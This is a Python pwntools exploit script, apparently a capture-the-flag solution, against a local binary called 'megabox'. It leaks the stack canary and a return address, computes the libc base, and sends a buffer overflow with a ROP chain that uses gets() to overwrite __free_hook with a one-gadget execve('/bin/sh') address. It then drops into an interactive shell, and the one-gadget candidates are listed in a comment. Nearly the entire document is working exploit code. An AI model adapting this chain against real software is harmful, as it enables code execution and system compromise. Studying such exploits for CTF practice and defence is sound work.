from pwn import *
#context.update(arch='amd64', os= 'linux', log_level='debug')
def _print():
    p.sendlineafter('>> ', '2')
    p.recvuntil('oops!!\n')
    data = p.recv(1000)
    p.recvuntil('thank you.')
    return data

def _write(contents):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('>> ', contents+'\x00')
def _exit():
    p.sendlineafter('>> ', '3')


p = process("megabox")

p.recvrepeat(0.2)
p.sendline('1')

_write('1')
data = _print()

canary = data[0x90-8:0x90]
log.info('canary: ' + hex(u64(canary)))
addr_ret =  u64(data[0x90+8:0x90+16])
log.info('ret: ' + hex(addr_ret))


elf = ELF('megabox')
addr_gets_plt = elf.plt['gets']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_freeHook = libc.symbols['__free_hook']

log.info('__free_hook: ' + hex(offset_freeHook))
'''
0xcb79a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcb79d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcb7a0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xe926b execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NUL
'''
offset_oneshot = 0xe926b
addr_prdi_ret = 0x401043
addr_prsi_ret = 0x401041

addr_main = 0x400E7F
libc_base = addr_ret - 0xFD2EF

addr_oneshot = libc_base + offset_oneshot
addr_freeHook = libc_base + offset_freeHook
addr_callFree = 0x400FD0 
addr_free_plt = elf.plt['free']

log.info('gets: ' + hex(addr_gets_plt))


_write('a'*0x88 + canary + 'd'*8 + p64(addr_prdi_ret) + p64(addr_freeHook) +  p64(addr_gets_plt) + p64(addr_ret))

_exit()

p.sendline(p64(addr_oneshot))


p.interactive()

